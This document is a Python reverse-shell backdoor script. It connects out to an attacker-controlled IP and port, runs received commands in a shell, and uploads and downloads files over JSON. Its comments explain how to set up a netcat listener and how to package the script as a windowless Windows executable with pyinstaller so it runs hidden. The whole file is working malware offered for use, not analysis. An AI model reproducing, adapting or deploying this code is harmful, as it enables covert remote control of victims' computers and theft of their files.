#!/usr/bin/env python
# setup listening in backdoor server nc -lvp 4444 if using netcat
import socket
import subprocess
import json
import os
import base64
import sys

class Backdoor:
    # establish TCP socket
    def __init__(self, hacker_ip, hacker_port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((hacker_ip, hacker_port))

    def send_to_listener(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
    
    def receive_from_listener(self):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) 
    
    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())
        
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful."

    def run(self):
        while True:
            command = self.receive_from_listener()

            try:
                if command[0] == "exit":
                    self.connection.close() #close the socket
                    sys.exit() #exit the program
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1]).decode()
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command).decode()
            except Exception:
                command_result = "[-] Error during command execution."

            self.send_to_listener(command_result)

# You need to change this to your PubIP & Port before running this .python file or reference this directly as an argument when running your code.
my_backdoor = Backdoor(str(hacker_publicIP), hacker_port)
my_backdoor.run()


# How to convert python code into an executable in windows:
# Install pyinstaller in your system: C:\Python27\python.exe -m pip install pyinstaller # find the name of the file path where python is installed
# Then compile into an exec: C:\Python27\Scripts\pyinstaller.exe reverse_backdoor.py --onefile --noconsole # find the path of pyinstaller.exe
# --onefile ensures that reverse_door.py is compiled into one executable file

